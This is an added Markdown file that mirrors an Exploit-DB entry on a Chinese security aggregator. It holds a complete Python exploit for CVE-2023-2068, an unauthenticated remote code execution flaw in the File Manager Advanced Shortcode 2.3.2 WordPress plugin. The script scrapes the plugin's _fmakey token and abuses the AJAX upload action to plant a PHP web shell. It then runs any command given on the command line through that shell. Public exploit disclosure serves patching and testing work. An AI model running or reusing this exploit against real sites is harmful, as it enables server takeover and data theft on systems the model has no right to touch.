@@ -1,0 +1,134 @@
+---
+title: [webapps] File Manager Advanced Shortcode 2.3.2 - Unauthenticated Remote Code Execution (RCE)
+url: https://buaq.net/go-167183.html
+source: unSafe.sh - 不安全
+date: 2023-06-05
+fetch_date: 2025-10-04T11:44:38.901214
+---
+
+# [webapps] File Manager Advanced Shortcode 2.3.2 - Unauthenticated Remote Code Execution (RCE)
+
+* [unSafe.sh - 不安全](https://unsafe.sh)
+* [我的收藏](/user/collects)
+* [今日热榜](/?hot=true)
+* [公众号文章](/?gzh=true)
+* [导航](/nav/index)
+* [Github CVE](/cve)
+* [Github Tools](/tools)
+* [编码/解码](/encode)
+* [文件传输](/share/index)
+* [Twitter Bot](https://twitter.com/buaqbot)
+* [Telegram Bot](https://t.me/aqinfo)
+* [Search](/search/search)
+
+[Rss](/rss.xml)
+
+[ ]
+黑夜模式
+
+![]()
+
+[webapps] File Manager Advanced Shortcode 2.3.2 - Unauthenticated Remote Code Execution (RCE)
+
+# Exploit Title: File Manager Advanced Shortcode
+*2023-6-4 08:0:0
+Author: [www.exploit-db.com(查看原文)](/jump-167183.htm)
+阅读量:21
+收藏*
+
+---
+
+```
+# Exploit Title: File Manager Advanced Shortcode 2.3.2 - Unauthenticated Remote Code Execution (RCE)
+# Date: 05/31/2023
+# Exploit Author: Mateus Machado Tesser
+# Vendor Homepage: https://advancedfilemanager.com/
+# Version: File Manager Advanced Shortcode 2.3.2
+# Tested on: Wordpress 6.1 / Linux (Ubuntu) 5.15
+# CVE: CVE-2023-2068
+
+import requests
+import json
+import pprint
+import sys
+import re
+
+PROCESS = "\033[1;34;40m[*]\033[0m"
+SUCCESS = "\033[1;32;40m[+]\033[0m"
+FAIL = "\033[1;31;40m[-]\033[0m"
+
+try:
+	COMMAND = sys.argv[2]
+	IP = sys.argv[1]
+	if len(COMMAND) > 1:
+		pass
+	if IP:
+		pass
+	else:
+		print(f'Use: {sys.argv[0]} IP COMMAND')
+except:
+	pass
+
+url = 'http://'+IP+'/' # Path to File Manager Advanced Shortcode Panel
+print(f"{PROCESS} Searching fmakey")
+
+try:
+	r = requests.get(url)
+	raw_fmakey = r.text
+	fmakey = re.findall('_fmakey.*$',raw_fmakey,re.MULTILINE)[0].split("'")[1]
+	if len(fmakey) == 0:
+		print(f"{FAIL} Cannot found fmakey!")
+except:
+	print(f"{FAIL} Cannot found fmakey!")
+
+print(f'{PROCESS} Exploiting Unauthenticated Remote Code Execution via AJAX!')
+url = "http://"+IP+"/wp-admin/admin-ajax.php"
+headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryI52DGCOt37rixRS1", "Accept": "*/*"}
+data = "------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\"reqid\"\r\n\r\n\r\n"
+data += "------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n"
+data += "------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n"
+data += "------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\"hashes[l1_cG5nLWNsaXBhcnQtaGFja2VyLWhhY2tlci5wbmc]\"\r\n\r\nexploit.php\r\n"
+data += "------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nfma_load_shortcode_fma_ui\r\n"
+data += "------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\"_fmakey\"\r\n\r\n"+fmakey+"\r\n"
+data += "------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\"path\"\r\n\r\n\r\n"
+data += "------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\"url\"\r\n\r\n\r\n"
+data += "------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\"w\"\r\n\r\nfalse\r\n"
+data += "------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\"r\"\r\n\r\ntrue\r\n"
+data += "------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\"hide\"\r\n\r\nplugins\r\n"
+data += "------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\"operations\"\r\n\r\nupload,download\r\n"
+data += "------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\"path_type\"\r\n\r\ninside\r\n"
+data += "------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\"hide_path\"\r\n\r\nno\r\n"
+data += "------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\"enable_trash\"\r\n\r\nno\r\n"
+data += "------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\"upload_allow\"\r\n\r\ntext/x-php\r\n"
+data += "------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\"upload_max_size\"\r\n\r\n2G\r\n"
+data += "------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"exploit2.php\"\r\nContent-Type: text/x-php\r\n\r\n<?php system($_GET['cmd']);?>\r\n"
+data += "------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\"mtime[]\"\r\n\r\n\r\n------WebKitFormBoundaryI52DGCOt37rixRS1--\r\n"
+r = requests.post(url, headers=headers, data=data)
+print(f"{PROCESS} Sending AJAX request to: {url}")
+if 'errUploadMime' in r.text:
+	print(f'{FAIL} Exploit failed!')
+	sys.exit()
+elif r.headers['Content-Type'].startswith("text/html"):
+	print(f'{FAIL} Exploit failed! Try to change _fmakey')
+	sys.exit(0)
+else:
+	print(f'{SUCCESS} Exploit executed with success!')
+exploited = json.loads(r.text)
+url = ""
+print(f'{PROCESS} Getting URL with webshell')
+for i in exploited["added"]:
+	url = i['url']
+print(f"{PROCESS} Executing '{COMMAND}'")
+r = requests.get(url+'?cmd='+COMMAND)
+print(f'{SUCCESS} The application returned ({len(r.text)} length):\n'+r.text)
+```
+
+文章来源: https://www.exploit-db.com/exploits/51505
+ 如有侵权请联系:admin#unsafe.sh
+
+© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)
+
+* admin#unsafe.sh
+* [安全马克](https://aq.mk)
+* [星际黑客](https://xj.hk)
+* [T00ls](https://t00ls.net)
